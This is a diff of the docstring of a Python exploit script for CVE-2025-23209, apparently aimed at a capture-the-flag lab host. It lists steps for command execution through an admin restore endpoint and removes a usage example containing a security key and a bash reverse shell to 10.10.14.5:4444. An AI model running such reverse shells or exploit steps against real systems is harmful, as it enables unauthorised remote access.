@@ -17,11 +17,7 @@ EXPLOITATION:
 4. POST to /admin/actions/updater/restore-db
 5. Command executes as PHP-FPM user (medapp)
 
-USAGE:
-    python3 exploit_cve_2025_23209.py \\
-        --url http://caresync.htb \\
-        --security-key 5f2e7a8cb8994d45ab3b4e81205bdf44 \\
-        --command 'bash -c "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1"'
+
 """
 
 import argparse
